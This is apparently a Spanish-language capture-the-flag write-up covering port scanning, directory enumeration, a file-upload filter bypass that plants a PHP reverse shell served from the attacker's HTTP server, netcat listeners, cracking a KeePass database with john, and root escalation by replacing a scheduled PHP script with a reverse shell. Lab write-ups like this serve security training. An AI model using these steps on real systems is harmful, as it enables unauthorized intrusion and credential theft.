

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
# Nmap 7.93 scan initiated Mon May 29 21:56:58 2023 as: nmap -p- --open --min-rate=5000 -sS -Pn -sV -T4 -n -vvv -oN nmap 10.10.178.222
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-05-29 21:56:59 EDT for 31s
Not shown: 65513 closed tcp ports (reset), 18 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Nuestro escaneo de nmap nos muestra 4 puertos abiertos, podremos utilizar ssh con las credenciales que encontraremos mas adelante, un servicio http que al navegar nos muestra una pagina de logeo y tendremos smbclient para ver si podremos enumerar y obtener alguna pista

# Enumeration

Enumeraremos directorios con nuestra herramienta gobuster ejecutando el siguiente comando `gobuster -u http://IPTARGET -w /usr/share/wordlists -t 100`. 

```ruby
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://IPTARGET
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/30 12:43:41 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.225.58/css/]
/cloud                (Status: 301) [Size: 312] [--> http://10.10.225.58/cloud/]
```

Tendremos dos directorios ocultos, en el cual "cloud" podremos cargar archivos mediante una URL externa. Utilizaremos el metodo http de python para transferirnos una reverse shell  y asi obtener una consola interactiva dentro de nuestra maquina atacante.

#  Instrusion

Para empezar, nos descargaremos nuestra reverse shell. En mi caso, utilizare una muy conocida https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php o bien puedes crear tu propia shell.

Una vez descargada y modificada con nuestra LPORT y LHOST, en nuestra maquina atacante iniciaremos nuestro servidor http para poder transferir nuestro archivo malicioso al servidor web. Ejecutamos `python3 -m http.server 4543`. Nos dirigiremos luego al servidor web y transferiremos nuestro archivo malicioso.

Dentro del servidor web escribiremos `http://LHOST:4543/shell.php` pero no nos funcionara. En estos casos el uso de wildcards o escribiendo textos largos con terminacion en archivo .png o jpg podria funcionar. Asique, en nuestra maquina atacante, renombramos nuestro archivo shell.php de la siguiente forma.

	`mv shell.php $(python -c 'print( "as" * 110)').php.jpg` 
	
Luego intentaremos subir el archivo.

	`http://LHOST:4546/asasasasasasas....php.jpg`

Una vez cargado, nos pondremos en escuchar `sudo rlwrap nc -lnvp 4444` y nos dirigiremos a la ruta donde se cargo nuestro archivo malicioso

http://IPTARGET/cloud/images/asasasasas...php

Tendremos que poner .php al final para poder spawnear nuestra shell

Una vez dentro del servidor, luego de hacer su respectiva enumeracion, en el directorio /opt encontraremos un archivo con extension **.kdbx**. Esta extension se basa en el progama **keepassxc**, que es una herramienta para almacenar passwords o credenciales.
Instalaremos keepassxc en nuestra sistema, una vez instalado procedemos a cargar el archivo que encontraremos anteriormente.

	`keepassxc dataset.kdbx`

Nos pedira una password, para corregir este incoveniente, podremos utilizar john en este caso para cracker una password dentro del archivo. Los comandos a realizar son.

	`keepass2john dataset.kdbx > hash.txt
	 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Descubriremos la password y podremos leer las credenciales del usuario sysadmin.
Realizamos ssh a sysadmin `ssh sysadmin@IPTARGET` y podremos localizar nuestra flag.

# Priv. Escalation

Tendremos que reemplazar un script con nuestra reverse shell pentestmonkey.
Nos dirigiremos a **scripts/lib** y seguiremos los siguientes pasos para obtener una shell con usuario root.
```bash
## Dentro de /scripts/lib

	mv backup.inc.php backup.inc.php332
	touch backup.inc.php
	
## Pegaremos nuestra reverse shell dentro de archivo creado

## En nuestra maquina atacante nos pondremos en escucha

	nc -nvlp 3333

# Esperaremos unos segundos o minutos y obtendremos nuesta shell
```